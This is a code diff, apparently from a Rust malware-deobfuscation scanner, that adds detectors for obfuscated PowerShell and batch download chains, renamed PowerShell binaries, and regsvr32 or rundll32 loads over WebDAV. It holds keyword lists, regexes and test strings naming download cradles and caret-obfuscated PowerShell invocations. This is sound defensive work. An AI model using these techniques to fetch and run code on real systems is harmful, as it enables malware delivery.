+                .find(|l| l.contains(&url))
+                .map(|l| l.chars().take(200).collect::<String>())
+                .unwrap_or_default();
+            if is_noise_url_context(&line_hint, &url) {
+                continue;
+            }
+
+            env.traits.push(Trait::DownloadInDeobText {
+                src: url,
+                line_hint,
+            });
+        }
+    });
+}
+
+/// Scan the small synthetic text assembled from recovered binary artifact
+/// strings. The collector only admits behavior hints for these detector
+/// families, so running the full deobfuscated-text scanner stack here is
+/// unnecessary work and can introduce unrelated matches if future hints are
+/// added too broadly.
+pub fn scan_recovered_artifact_behavior_text(text: &str, env: &mut Environment) {
+    scan_defender_evasion(text, env);
+    scan_inmem_assembly_load(text, env);
+    scan_anti_recovery(text, env);
+}
+
+fn scan_resolved_deob_var_fragment_urls(deobfuscated: &str, env: &mut Environment) {
+    if !has_resolved_deob_var_fragment_shape(deobfuscated) {
+        return;
+    }
+
+    let known = env.known_extracted_urls();
+    let mut scratch = env.clone();
+    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
+    let mut candidates = 0usize;
+    for line in deobfuscated.lines() {
+        crate::handlers::set::h_set(line, &mut scratch);
+        if candidates >= 32 {
+            break;
+        }
+        if line.len() > 16 * 1024 {
+            continue;
+        }
+        if !line.contains('%') || !line.contains("://") || !line.contains(":~") {
+            continue;
+        }
+        candidates += 1;
+        let mut expanded_inputs = Vec::new();
+        let expanded = crate::normalize::normalize_to_string(&crate::lex::lex(line), &mut scratch);
+        if expanded != line && expanded.contains("://") {
+            expanded_inputs.push(expanded);
+        }
+        collect_resolved_quoted_var_fragment_inputs(line, &mut scratch, &mut expanded_inputs);
+        collect_resolved_var_fragment_url_inputs(line, &mut scratch, &mut expanded_inputs);
+
+        for expanded in expanded_inputs {
+            for caps in URL_RE.captures_iter(&expanded) {
+                let Some(m) = caps.get(1) else { continue };
+                let mut url = m.as_str().to_string();
+                while let Some(last) = url.chars().last() {
+                    if matches!(
+                        last,
+                        ',' | '.' | ';' | ':' | ')' | ']' | '}' | '"' | '\'' | '!' | '?' | '\\'
+                    ) {
+                        url.pop();
+                    } else {
+                        break;
+                    }
+                }
+                if url.len() < 8 {
+                    continue;
+                }
+                if let Some(normalized) = normalize_liberal_url_token(&url) {
+                    url = normalized;
+                }
+                if is_noise_url(&url)
+                    || is_known_or_known_query_prefix(&known, &url)
+                    || !seen.insert(url.clone())
+                {
+                    continue;
+                }
+                env.traits.push(Trait::DownloadInDeobText {
+                    src: url,
+                    line_hint: "resolved-deob-var-fragments".to_string(),
+                });
+            }
+        }
+    }
+}
+
+pub(crate) fn has_resolved_deob_var_fragment_shape(deobfuscated: &str) -> bool {
+    if !deobfuscated.contains('%') || !deobfuscated.contains("://") || !deobfuscated.contains(":~")
+    {
+        return false;
+    }
+
+    deobfuscated.lines().any(|line| {
+        line.len() <= 16 * 1024 && line.contains('%') && line.contains("://") && line.contains(":~")
+    })
+}
+
+fn collect_resolved_quoted_var_fragment_inputs(
+    line: &str,
+    env: &mut Environment,
+    out: &mut Vec<String>,
+) {
+    let mut quote_start: Option<(usize, char)> = None;
+    for (idx, ch) in line.char_indices() {
+        match quote_start {
+            Some((start, quote)) if ch == quote => {
+                let segment = &line[start + quote.len_utf8()..idx];
+                if segment.len() <= 8192
+                    && segment.contains('%')
+                    && segment.contains("://")
+                    && segment.contains(":~")
+                {
+                    let expanded =
+                        crate::normalize::normalize_to_string(&crate::lex::lex(segment), env);
+                    if expanded != segment && expanded.contains("://") {
+                        out.push(expanded);
+                    }
+                }
+                quote_start = None;
+            }
+            None if ch == '\'' || ch == '"' => {
+                quote_start = Some((idx, ch));
+            }
+            _ => {}
+        }
+    }
+}
+
+fn collect_resolved_var_fragment_url_inputs(
+    line: &str,
+    env: &mut Environment,
+    out: &mut Vec<String>,
+) {
+    let mut search_start = 0usize;
+    while let Some(rel_marker) = line[search_start..].find("://") {
+        let marker = search_start + rel_marker;
+        let start = line[..marker]
+            .char_indices()
+            .rev()
+            .find_map(|(idx, ch)| {
+                if is_var_fragment_url_boundary(ch) {
+                    Some(idx + ch.len_utf8())
+                } else {
+                    None
+                }
+            })
+            .unwrap_or(0);
+        let after_marker = marker + "://".len();
+        let end = line[after_marker..]
+            .char_indices()
+            .find_map(|(rel_idx, ch)| {
+                if is_var_fragment_url_boundary(ch) {
+                    Some(after_marker + rel_idx)
+                } else {
+                    None
+                }
+            })
+            .unwrap_or(line.len());
+        let segment = &line[start..end];
+        if segment.len() <= 8192
+            && segment.contains('%')
+            && segment.contains("://")
+            && segment.contains(":~")
+        {
+            let expanded = crate::normalize::normalize_to_string(&crate::lex::lex(segment), env);
+            if expanded != segment && expanded.contains("://") {
+                out.push(expanded);
+            }
+        }
+        search_start = after_marker;
+    }
+}
+
+fn is_var_fragment_url_boundary(ch: char) -> bool {
+    ch.is_whitespace() || matches!(ch, '"' | '\'' | '(' | ')' | '[' | ']' | '{' | '}' | ';')
+}
+
+pub fn scan_raw_marker_powershell_urls(input: &[u8], env: &mut Environment) {
+    if !input.windows(2).any(|window| window == b"%!") {
+        return;
+    }
+    let text = String::from_utf8_lossy(input);
     let mut normalized = text.replace('^', "");
     normalized = normalized
         .replace("%!A%", "E")
@@ -3481,6 +8716,26 @@ pub fn scan_raw_marker_powershell_urls(input: &[u8], env: &mut Environment) {
             || lower.contains("webclient"))
     {
         return;
+    }
+
+    let ps_payload = normalized
+        .lines()
+        .filter(|line| {
+            let line_lower = line.to_ascii_lowercase();
+            line_lower.contains("powershell")
+                || line_lower.contains("download")
+                || line_lower.contains("adstring")
+        })
+        .collect::<Vec<_>>()
+        .join("\n");
+    if !ps_payload.is_empty() {
+        let normalized_payload = ps_payload.as_bytes().to_vec();
+        let mut payload_env = env.clone();
+        let traits_before = payload_env.traits.len();
+        payload_env.all_extracted_ps1 = vec![normalized_payload];
+        crate::ps1_scan::scan_ps1_payloads(&mut payload_env);
+        env.traits
+            .extend(payload_env.traits.into_iter().skip(traits_before));
     }
 
     let known = env.known_extracted_urls();
@@ -3521,6 +8776,9 @@ pub fn scan_raw_marker_powershell_urls(input: &[u8], env: &mut Environment) {
 }
 
 pub fn scan_embedded_powershell_invocations(text: &str, env: &mut Environment) {
+    if !has_embedded_powershell_invocation_atom(text) {
+        return;
+    }
     let normalized = text.replace('^', "");
     for line in normalized.lines() {
         for m in EMBEDDED_POWERSHELL_RE.find_iter(line) {
@@ -3534,8 +8792,136 @@ pub fn scan_embedded_powershell_invocations(text: &str, env: &mut Environment) {
     dedup_exec_ps1(env);
 }
 
+fn has_embedded_powershell_invocation_atom(text: &str) -> bool {
+    contains_ascii_case_insensitive_command_atom_with_optional_carets(
+        text.as_bytes(),
+        b"powershell",
+    ) || contains_ascii_case_insensitive_command_atom_with_optional_carets(text.as_bytes(), b"pwsh")
+}
+
+fn contains_ascii_case_insensitive_command_atom_with_optional_carets(
+    haystack: &[u8],
+    needle: &[u8],
+) -> bool {
+    if needle.is_empty() {
+        return true;
+    }
+
+    for (start, &b) in haystack.iter().enumerate() {
+        if !is_ascii_command_atom_start_boundary(haystack, start) {
+            continue;
+        }
+        if !b.eq_ignore_ascii_case(&needle[0]) {
+            continue;
+        }
+
+        let mut hay_idx = start + 1;
+        let mut needle_idx = 1;
+        while needle_idx < needle.len() && hay_idx < haystack.len() {
+            let current = haystack[hay_idx];
+            if current == b'^' {
+                hay_idx += 1;
+                continue;
+            }
+            if !current.eq_ignore_ascii_case(&needle[needle_idx]) {
+                break;
+            }
+            hay_idx += 1;
+            needle_idx += 1;
+        }
+        if needle_idx == needle.len() && is_ascii_command_atom_end_boundary(haystack, hay_idx) {
+            return true;
+        }
+    }
+
+    false
+}
+
+fn is_ascii_command_atom_start_boundary(haystack: &[u8], start: usize) -> bool {
+    start == 0
+        || haystack
+            .get(start - 1)
+            .map_or(true, |b| !b.is_ascii_alphanumeric() && *b != b'_')
+}
+
+fn is_ascii_command_atom_end_boundary(haystack: &[u8], mut end: usize) -> bool {
+    if haystack.get(end) == Some(&b'.')
+        && haystack
+            .get(end + 1..end + 4)
+            .is_some_and(|suffix| suffix.eq_ignore_ascii_case(b"exe"))
+    {
+        end += 4;
+    }
+    let boundary = haystack
+        .get(end)
+        .map_or(true, |b| !b.is_ascii_alphanumeric() && *b != b'_');
+    // Avoid treating `powershell.dll` / `powershellconsole` style paths
+    // as invocations; `.exe` is the only dotted command suffix accepted.
+    boundary && haystack.get(end) != Some(&b'.')
+}
+
+#[cfg(test)]
+mod embedded_powershell_invocation_gate_tests {
+    use super::has_embedded_powershell_invocation_atom;
+
+    #[test]
+    fn allows_plain_powershell_and_pwsh_atoms() {
+        assert!(has_embedded_powershell_invocation_atom(
+            "powershell -enc AAAA"
+        ));
+        assert!(has_embedded_powershell_invocation_atom(
+            "powershell.exe -enc AAAA"
+        ));
+        assert!(has_embedded_powershell_invocation_atom("PwSh -c iwr"));
+        assert!(has_embedded_powershell_invocation_atom("PwSh.exe -c iwr"));
+    }
+
+    #[test]
+    fn allows_caret_obfuscated_powershell_atom() {
+        assert!(has_embedded_powershell_invocation_atom(
+            "p^o^w^e^r^s^h^e^l^l -enc AAAA"
+        ));
+    }
+
+    #[test]
+    fn blocks_pwsh_inside_encoded_token() {
+        assert!(!has_embedded_powershell_invocation_atom(
+            "set X=abcPWSHdef123"
+        ));
+    }
+
+    #[test]
+    fn blocks_powershell_inside_path_component() {
+        assert!(!has_embedded_powershell_invocation_atom(
+            r"copy C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1 out.txt"
+        ));
+    }
+
+    #[test]
+    fn blocks_unrelated_caret_heavy_text() {
+        assert!(!has_embedded_powershell_invocation_atom(
+            "^p ^o ^w ^not ^a ^shell command"
+        ));
+    }
+}
+
 pub fn scan_renamed_powershell_invocations(text: &str, env: &mut Environment) {
     let mut aliases: std::collections::HashSet<String> = std::collections::HashSet::new();
+
+    for t in &env.traits {
+        let Trait::WindowsUtilManip { src, dst, .. } = t else {
+            continue;
+        };
+        let src_base = command_basename(src);
+        if !matches!(
+            src_base.as_str(),
+            "powershell.exe" | "powershell" | "pwsh.exe" | "pwsh"
+        ) {
+            continue;
+        }
+        aliases.insert(command_basename(dst));
+        aliases.insert(dst.trim_matches('"').to_ascii_lowercase());
+    }
 
     for line in text.lines() {
         let words = split_words(line);
@@ -3579,6 +8965,7 @@ pub fn scan_renamed_powershell_invocations(text: &str, env: &mut Environment) {
         if !looks_like_embedded_powershell_payload(line) {
             continue;
         }
+        push_manipulated_exec_once(env, line, command);
         let rest = line
             .get(command.len()..)
             .map(str::trim_start)
@@ -3591,6 +8978,99 @@ pub fn scan_renamed_powershell_invocations(text: &str, env: &mut Environment) {
         crate::handlers::powershell::h_powershell(&replay, env);
     }
     dedup_exec_ps1(env);
+}
+
+fn push_manipulated_exec_once(env: &mut Environment, cmd: &str, target: &str) {
+    let target = target.trim_matches(['"', '\'']).to_string();
+    if !env.traits.iter().any(|t| {
+        matches!(
+            t,
+            Trait::ManipulatedExec {
+                cmd: existing_cmd,
+                target: existing_target
+            } if existing_cmd == cmd && existing_target == &target
+        )
+    }) {
+        env.traits.push(Trait::ManipulatedExec {
+            cmd: cmd.to_string(),
+            target,
+        });
+    }
+}
+
+fn scan_embedded_powershell_downloads_in_deob_text(text: &str, env: &mut Environment) {
+    if !has_embedded_powershell_invocation_atom(text) {
+        return;
+    }
+    let normalized = text.replace('^', "");
+    let mut payload_env = Environment::new(&Config {
+        max_depth: env.limits.max_depth,
+        max_iterations: env.limits.max_iterations,
+        max_child_scripts: env.limits.max_child_scripts,
+        timeout_secs: 0,
+        self_extract: false,
+        winver: env.winver,
+        max_output_bytes: env.limits.max_output_bytes,
+        max_output_line_bytes: env.limits.max_output_line_bytes,
+        max_traits_per_kind: 100,
+    });
+    payload_env.ps1_scan_cache_normalized = false;
+
+    for line in normalized.lines() {
+        for m in EMBEDDED_POWERSHELL_RE.find_iter(line) {
+            let tail = &line[m.start()..];
+            if !has_powershell_download_atom(tail) {
+                continue;
+            }
+            crate::handlers::powershell::h_powershell(tail, &mut payload_env);
+        }
+    }
+    if payload_env.exec_ps1.is_empty() {
+        return;
+    }
+
+    payload_env
+        .all_extracted_ps1
+        .extend(std::mem::take(&mut payload_env.exec_ps1));
+    crate::ps1_scan::scan_ps1_payloads(&mut payload_env);
+
+    let mut known = env.known_extracted_urls();
+    for t in payload_env.traits {
+        if let Some(url) = trait_url(&t) {
+            if known.contains(url) {
+                continue;
+            }
+            known.insert(url.to_string());
+        }
+        env.traits.push(t);
+    }
+}
+
+fn has_powershell_download_atom(text: &str) -> bool {
+    let lower = text.to_ascii_lowercase();
+    PS_DOWNLOAD_VERB_RE.is_match(&lower)
+        || lower.contains("invoke-webrequest")
+        || lower.contains("invoke-restmethod")
+        || lower.contains("downloadstring")
+        || lower.contains("downloadfile")
+        || lower.contains("downloaddata")
+        || lower.contains("start-bitstransfer")
+        || lower.contains("new-object net.webclient")
+}
+
+fn trait_url(t: &Trait) -> Option<&str> {
+    match t {
+        Trait::Download { src, .. } | Trait::DownloadInDeobText { src, .. } => Some(src),
+        Trait::CertutilDownload { url, .. }
+        | Trait::BitsadminDownload { url, .. }
+        | Trait::UrlLaunch { url, .. }
+        | Trait::UrlArgument { url, .. }
+        | Trait::UrlVariable { url, .. }
+        | Trait::RegistryUrl { url, .. } => Some(url),
+        Trait::Rundll32 { url: Some(url), .. } => Some(url),
+        Trait::UncWebDavC2 { http_url, .. } if !http_url.is_empty() => Some(http_url),
+        _ => None,
+    }
 }
 
 fn command_basename(word: &str) -> String {
@@ -3779,6 +9259,7 @@ fn is_download_context_line(line: &str) -> bool {
         || lower.contains("new-object net.webclient")
         || lower.contains("bitsadmin")
         || lower.contains("urlcache")
+        || lower.contains("verifyctl")
         || lower.contains("curl ")
         || lower.contains("curl.exe")
         || lower.contains("wget ")
@@ -3976,6 +9457,9 @@ fn try_extract_url_from_buf(
 pub fn scan_ps_replace_chain_urls(deobfuscated: &str, env: &mut Environment) {
     use once_cell::sync::Lazy;
     use regex::Regex;
+    if !has_ps_replace_chain_url_atom(deobfuscated) {
+        return;
+    }
     // Collect every `.Replace('A', 'B')` (and `-replace 'A', 'B'`) pair.
     let pairs = crate::aes_chain::ps_extract::find_replace_chain(deobfuscated);
     if pairs.is_empty() {
@@ -4036,6 +9520,21 @@ pub fn scan_ps_replace_chain_urls(deobfuscated: &str, env: &mut Environment) {
     }
 }
 
+fn has_ps_replace_chain_url_atom(text: &str) -> bool {
+    let lower = text.to_ascii_lowercase();
+    (lower.contains(".replace")
+        || lower.contains("-replace ")
+        || lower.contains("-replace\t")
+        || lower.contains("-replace\r")
+        || lower.contains("-replace\n"))
+        && (lower.contains("htxp")
+            || lower.contains("hxxp")
+            || lower.contains("quwd")
+            || lower.contains("http")
+            || lower.contains("ftp:")
+            || lower.contains("file:"))
+}
+
 /// PowerShell char-index-extractor deobfuscation. Family pattern
 /// (Musculos / 订单列表.bat style — 30+ corpus samples):
 ///
@@ -4054,6 +9553,10 @@ pub fn scan_ps_replace_chain_urls(deobfuscated: &str, env: &mut Environment) {
 pub fn scan_ps_char_index_extractor_urls(deobfuscated: &str, env: &mut Environment) {
     use once_cell::sync::Lazy;
     use regex::Regex;
+    if !has_ps_char_index_extractor_atom(deobfuscated) {
+        return;
+    }
+
     // Two-pass detection because the `regex` crate lacks backreferences:
     //   (1) Find `function NAME(...){...}` blocks (header capture only).
     //   (2) Inside each block, find any `$IDX=START` / `$IDX+=STEP`
@@ -4135,6 +9638,8 @@ pub fn scan_ps_char_index_extractor_urls(deobfuscated: &str, env: &mut Environme
         let Ok(call_re) = Regex::new(&pattern) else {
             continue;
         };
+        let mut extracted_strings = Vec::new();
+        let mut extracted_urls = Vec::new();
         for call_caps in call_re.captures_iter(deobfuscated).take(64) {
             let Some(arg) = call_caps.get(1) else {
                 continue;
@@ -4150,6 +9655,7 @@ pub fn scan_ps_char_index_extractor_urls(deobfuscated: &str, env: &mut Environme
             if extracted.len() < 8 {
                 continue;
             }
+            extracted_strings.push(extracted.clone());
             // Look for URLs in the extracted string.
             for url_caps in URL_RE.captures_iter(&extracted) {
                 let Some(m) = url_caps.get(1) else { continue };
@@ -4170,16 +9676,68 @@ pub fn scan_ps_char_index_extractor_urls(deobfuscated: &str, env: &mut Environme
                 if known.contains(&url) || !seen.insert(url.clone()) {
                     continue;
                 }
+                extracted_urls.push(url);
+            }
+        }
+        if extracted_urls.is_empty() {
+            continue;
+        }
+        let has_download_context = extracted_strings.iter().any(|s| {
+            let lower = s.to_ascii_lowercase();
+            lower.contains("downloadfile")
+                || lower.contains("downloadstring")
+                || lower.contains("invoke-webrequest")
+                || lower.contains("invoke-restmethod")
+                || lower.contains("start-bitstransfer")
+        });
+        for url in extracted_urls {
+            let cmd = format!(
+                "ps-char-index-extractor (fn={}, start={}, step={})",
+                name, start, step
+            );
+            if has_download_context {
+                env.traits.push(Trait::Download {
+                    cmd,
+                    src: url,
+                    dst: None,
+                });
+            } else {
                 env.traits.push(Trait::DownloadInDeobText {
                     src: url,
-                    line_hint: format!(
-                        "ps-char-index-extractor (fn={}, start={}, step={})",
-                        name, start, step
-                    ),
+                    line_hint: cmd,
                 });
             }
         }
     }
+}
+
+fn has_ps_char_index_extractor_atom(text: &str) -> bool {
+    text.as_bytes().contains(&b'$')
+        && text.as_bytes().windows(2).any(|window| window == b"+=")
+        && has_ps_variable_index_atom(text)
+        && contains_ascii_case_insensitive_atom(text, b"function")
+        && ((contains_ascii_case_insensitive_atom(text, b"do")
+            && contains_ascii_case_insensitive_atom(text, b"until"))
+            || contains_ascii_case_insensitive_atom(text, b"for"))
+}
+
+fn has_ps_variable_index_atom(text: &str) -> bool {
+    let bytes = text.as_bytes();
+    let mut idx = 0;
+    while idx < bytes.len() {
+        if bytes[idx] != b'[' {
+            idx += 1;
+            continue;
+        }
+        idx += 1;
+        while idx < bytes.len() && bytes[idx].is_ascii_whitespace() {
+            idx += 1;
+        }
+        if idx < bytes.len() && bytes[idx] == b'$' {
+            return true;
+        }
+    }
+    false
 }
 
 /// PowerShell socket-style reverse shells store the C2 address as
@@ -4590,6 +10148,9 @@ pub fn scan_js_fromcharcode_urls(deobfuscated: &str, env: &mut Environment) {
 pub fn scan_ps_bare_url_downloads(deobfuscated: &str, env: &mut Environment) {
     use once_cell::sync::Lazy;
     use regex::Regex;
+    if !has_ps_bare_url_download_atom(deobfuscated) {
+        return;
+    }
     // Strict allowlist of TLDs we trust — broad enough to cover the
     // corpus's actual hits (rebrand.ly, goingupdate.com, 31yc.com,
     // backupitfirst.com) without firing on `Wscript.Shell`,
@@ -4599,7 +10160,7 @@ pub fn scan_ps_bare_url_downloads(deobfuscated: &str, env: &mut Environment) {
             r#"(?ix)
                 \b (?: Start-Process | saps | iwr | irm
                      | Invoke-WebRequest | Invoke-RestMethod ) \b
-                \s+ (?:-(?:Uri|FilePath|Path)\s+)?
+                \s+ (?:-(?:Uri|Ur|FilePath|FilePat|FilePa|FileP|File|Fil|Fi|F|Path|Pat|Pa|P)(?:\s+|[:=]))?
                 ['"]
                 (
                     (?:[a-z0-9\-]+\.){1,4}
@@ -4646,6 +10207,35 @@ pub fn scan_ps_bare_url_downloads(deobfuscated: &str, env: &mut Environment) {
             line_hint: "ps-bare-url-download".to_string(),
         });
     }
+}
+
+fn has_ps_bare_url_download_atom(text: &str) -> bool {
+    let lower = text.to_ascii_lowercase();
+    if !(lower.contains("start-process")
+        || lower.contains("saps")
+        || lower.contains("iwr")
+        || lower.contains("irm")
+        || lower.contains("invoke-webrequest")
+        || lower.contains("invoke-restmethod"))
+    {
+        return false;
+    }
+    if !(lower.contains('\'') || lower.contains('"')) {
+        return false;
+    }
+    [
+        "com", "net", "org", "io", "ru", "cn", "me", "info", "biz", "us", "co", "ly", "gg", "tk",
+        "xyz", "top", "life", "store", "app", "tools", "rocks", "click", "stream", "host",
+        "website", "pw", "dev", "sh", "space", "site", "live", "cloud", "online", "tech", "art",
+        "news", "pro", "cc", "to",
+    ]
+    .iter()
+    .any(|tld| {
+        let dotted = format!(".{tld}");
+        lower.contains(&format!("{dotted}/"))
+            || lower.contains(&format!("{dotted}'"))
+            || lower.contains(&format!("{dotted}\""))
+    })
 }
 
 pub fn scan_inline_b64_urls(deobfuscated: &str, env: &mut Environment) {
@@ -4810,10 +10400,10 @@ pub fn scan_truncated_url_vars(deobfuscated: &str, env: &mut Environment) {
 
 #[allow(clippy::expect_used)]
 static CERTUTIL_DECODE_RE: Lazy<Regex> = Lazy::new(|| {
-    // Matches: certutil [-f] -decode  (case-insensitive). We do not require
+    // Matches: certutil [-f] -decode  (case-insensitive, dash or slash flags). We do not require
     // the same source/target filenames; just the presence of a decode call
     // is enough to gate this sweep, paired with a preceding `echo <b64>`.
-    Regex::new(r"(?i)\bcertutil(?:\.exe)?\b[^\r\n]*?-decode\b").expect("certutil decode")
+    Regex::new(r"(?i)\bcertutil(?:\.exe)?\b[^\r\n]*?[-/]decode\b").expect("certutil decode")
 });
 
 #[allow(clippy::expect_used)]
@@ -5247,9 +10837,10 @@ pub fn scan_decimal_ip_urls(deobfuscated: &str, env: &mut Environment) {
             continue;
         }
         known.insert(url.clone());
-        env.traits.push(Trait::DownloadInDeobText {
+        env.traits.push(Trait::Download {
+            cmd: "decimal-ip-url".to_string(),
             src: url,
-            line_hint: "decimal-ip-url".to_string(),
+            dst: None,
         });
     }
 }
@@ -5491,6 +11082,31 @@ pub fn unc_webdav_to_http_url(host: &str, port: &str, share_path: &str) -> Strin
 }
 
 pub fn scan_unc_webdav(deobfuscated: &str, env: &mut Environment) {
+    for line in deobfuscated.lines() {
+        let tokens = split_words(line);
+        for (i, token) in tokens.iter().enumerate() {
+            let cmd = command_name(strip_quotes(token));
+            if cmd != "regsvr32" && cmd != "regsvr32.exe" {
+                continue;
+            }
+            let Some((command, url)) = regsvr32_webdav_target_after(line, &tokens, i + 1) else {
+                continue;
+            };
+            push_lolbas_once(env, "regsvr32", &command);
+            push_url_argument_once(env, &command, url);
+        }
+        for (i, token) in tokens.iter().enumerate() {
+            let cmd = command_name(strip_quotes(token));
+            if cmd != "rundll32" && cmd != "rundll32.exe" {
+                continue;
+            }
+            let Some((command, url)) = rundll32_webdav_target_after(line, &tokens, i + 1) else {
+                continue;
+            };
+            push_rundll32_once(env, &command, url);
+        }
+    }
+
     // Dedup by (host, port) — same WebDAV server on the same port is one C2 regardless
     // of which share path or file within it was accessed.
     let mut seen: std::collections::HashSet<(String, String)> = std::collections::HashSet::new();
@@ -5524,6 +11140,163 @@ pub fn scan_unc_webdav(deobfuscated: &str, env: &mut Environment) {
             http_url,
         });
     }
+    for caps in BARE_UNC_WEBDAV_RE.captures_iter(deobfuscated) {
+        let host = caps
+            .get(1)
+            .map(|m| m.as_str().to_string())
+            .unwrap_or_default();
+        let Some(full_match) = caps.get(0).map(|m| m.as_str()) else {
+            continue;
+        };
+        if !bare_webdav_unc_path(full_match) || !seen.insert((host.clone(), "80".to_string())) {
+            continue;
+        }
+        let command = deobfuscated
+            .lines()
+            .find(|l| l.contains(full_match))
+            .map(|l| l.chars().take(240).collect::<String>())
+            .unwrap_or_default();
+        if !contains_ascii_case_insensitive_atom(&command, b"rundll32") {
+            continue;
+        }
+        env.traits.push(Trait::UncWebDavC2 {
+            host: host.clone(),
+            port: "80".to_string(),
+            share_path: full_match.to_string(),
+            command,
+            http_url: unc_webdav_to_http_url(&host, "80", full_match),
+        });
+    }
+}
+
+fn regsvr32_webdav_target_after(
+    line: &str,
+    tokens: &[String],
+    start: usize,
+) -> Option<(String, String)> {
+    let limit = tokens.len().min(start.saturating_add(12));
+    for token in &tokens[start..limit] {
+        let candidate = strip_quotes(token);
+        if !regsvr32_webdav_loadable_target(candidate) {
+            continue;
+        }
+        let url = webdav_unc_to_http_url(candidate)?;
+        return Some((line.chars().take(240).collect::<String>(), url));
+    }
+    None
+}
+
+fn regsvr32_webdav_loadable_target(token: &str) -> bool {
+    strict_webdav_unc_path(token) && regsvr32_loadable_target(token)
+}
+
+fn rundll32_webdav_target_after(
+    line: &str,
+    tokens: &[String],
+    start: usize,
+) -> Option<(String, String)> {
+    let limit = tokens.len().min(start.saturating_add(8));
+    for token in &tokens[start..limit] {
+        let candidate = strip_quotes(token)
+            .split(',')
+            .next()
+            .unwrap_or("")
+            .trim_end_matches(['"', '\'', ')', ']', '}', ';']);
+        if !rundll32_webdav_loadable_target(candidate) {
+            continue;
+        }
+        let url = webdav_unc_to_http_url(candidate)?;
+        return Some((line.chars().take(240).collect::<String>(), url));
+    }
+    None
+}
+
+fn rundll32_webdav_loadable_target(token: &str) -> bool {
+    (strict_webdav_unc_path(token) || bare_webdav_unc_path(token))
+        && token.to_ascii_lowercase().ends_with(".dll")
+}
+
+fn webdav_unc_to_http_url(unc: &str) -> Option<String> {
+    let parts: Vec<&str> = unc.split('\\').filter(|part| !part.is_empty()).collect();
+    let host_port = parts.first()?;
+    if let Some((host, port)) = host_port.split_once('@') {
+        if host.is_empty() || port.is_empty() {
+            return None;
+        }
+        return Some(unc_webdav_to_http_url(host, port, unc));
+    }
+    if !bare_webdav_unc_path(unc) || host_port.is_empty() {
+        return None;
+    }
+    Some(unc_webdav_to_http_url(host_port, "80", unc))
+}
+
+fn strict_webdav_unc_path(token: &str) -> bool {
+    contains_ascii_case_insensitive_atom(token, b"davwwwroot")
+        && token.contains(r"\\")
+        && token.contains('@')
+}
+
+fn bare_webdav_unc_path(token: &str) -> bool {
+    let parts: Vec<&str> = token.split('\\').filter(|part| !part.is_empty()).collect();
+    parts.len() >= 3
+        && !parts[0].contains('@')
+        && parts[1].eq_ignore_ascii_case("webdav")
+        && !parts[2].is_empty()
+}
+
+fn push_url_argument_once(env: &mut Environment, cmd: &str, url: String) {
+    if env.traits.iter().any(|t| {
+        matches!(
+            t,
+            Trait::UrlArgument {
+                url: existing_url,
+                ..
+            } if existing_url == &url
+        )
+    }) {
+        return;
+    }
+    env.traits.push(Trait::UrlArgument {
+        cmd: cmd.to_string(),
+        url,
+    });
+}
+
+fn push_rundll32_once(env: &mut Environment, cmd: &str, url: String) {
+    if env.traits.iter().any(|t| {
+        matches!(
+            t,
+            Trait::Rundll32 {
+                url: existing_url,
+                ..
+            } if existing_url.as_deref() == Some(url.as_str())
+        )
+    }) {
+        return;
+    }
+    env.traits.push(Trait::Rundll32 {
+        cmd: cmd.to_string(),
+        url: Some(url),
+    });
+}
+
+fn push_lolbas_once(env: &mut Environment, name: &str, cmd: &str) {
+    if env.traits.iter().any(|t| {
+        matches!(
+            t,
+            Trait::Lolbas {
+                name: existing_name,
+                cmd: existing_cmd,
+            } if existing_name == name && existing_cmd == cmd
+        )
+    }) {
+        return;
+    }
+    env.traits.push(Trait::Lolbas {
+        name: name.to_string(),
+        cmd: cmd.to_string(),
+    });
 }
 
 #[cfg(test)]
@@ -5594,6 +11367,14 @@ mod noise_ip_tests {
         assert!(super::is_noise_url("http://logo.verisign.com/vslogo.gif"));
         assert!(super::is_noise_url("http://ts-ocsp.ws.symantec.com"));
         assert!(super::is_noise_url("https://d.symcb.com/cps"));
+        assert!(super::is_noise_url("http://www.usertrust.com1"));
+        assert!(super::is_noise_url("http://ocsp2.globalsign.com/rootr306"));
+        assert!(super::is_noise_url(
+            "https://www.globalsign.com/repository/0"
+        ));
+        assert!(super::is_noise_url(
+            "http://secure.globalsign.com/cacert/gstimestampingsha2g2.crt0"
+        ));
     }
 
     #[test]
@@ -5613,6 +11394,38 @@ mod noise_ip_tests {
             "http://www.red-gate.com/products/dotnet-development/smartassembly/?utm_source=x"
         ));
         assert!(super::is_noise_url("http://sawebservice.red-gate.com/"));
+        assert!(super::is_noise_url(
+            "http://www.smartassembly.com/webservices/Reporting/UploadReport2"
+        ));
+        assert!(super::is_noise_url("http://www.aiim.org/pdfa/ns/id/"));
+        assert!(super::is_noise_url(
+            "http://schemas.openxmlformats.org/markup-compatibility/2006"
+        ));
+        assert!(super::is_noise_url("http://www.iec.ch"));
+        assert!(super::is_noise_url(
+            "http://commons.wikimedia.org/wiki/File:Case_miditower.jpg"
+        ));
+        assert!(super::is_noise_url(
+            "https://www.chiark.greenend.org.uk/~sgtatham/putty/0"
+        ));
+        assert!(super::is_noise_url(
+            "http://tempuri.org/Database1DataSet.xsd"
+        ));
+        assert!(super::is_noise_url("https://www.autoitscript.com/autoit3/"));
+    }
+
+    #[test]
+    fn binary_resource_template_urls_are_noise() {
+        assert!(super::is_noise_url("https://www.youtube.com/embed/"));
+        assert!(super::is_noise_url("https://player.vimeo.com/video/"));
+        assert!(super::is_noise_url("https://ok.ru/videoembed/"));
+        assert!(super::is_noise_url(
+            "https://music.yandex.ru/iframe/#track/"
+        ));
+        assert!(super::is_noise_url("https://www.google.com/maps/place/"));
+        assert!(super::is_noise_url("https://www.cyotek.com"));
+        assert!(super::is_noise_url("http://sourceforge.net/p/compactview"));
+        assert!(super::is_noise_url("http://www.skinstudio.netG"));
     }
 
     #[test]
@@ -6004,7 +11817,7 @@ mod ps_tcp_client_tests {
 #[cfg(test)]
 #[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
 mod ps_char_index_extractor_tests {
-    use super::scan_ps_char_index_extractor_urls;
+    use super::{has_ps_char_index_extractor_atom, scan_ps_char_index_extractor_urls};
     use crate::env::Environment;
     use crate::traits::Trait;
     use crate::Config;
@@ -6019,6 +11832,16 @@ mod ps_char_index_extractor_tests {
                 _ => None,
             })
             .collect()
+    }
+
+    fn traits(script: &str) -> Vec<Trait> {
+        let mut env = Environment::new(&Config::default());
+        scan_ps_char_index_extractor_urls(script, &mut env);
+        env.traits
+    }
+
+    fn pad_extracted(decoded: &str) -> String {
+        decoded.chars().flat_map(|ch| ['x', ch]).collect::<String>()
     }
 
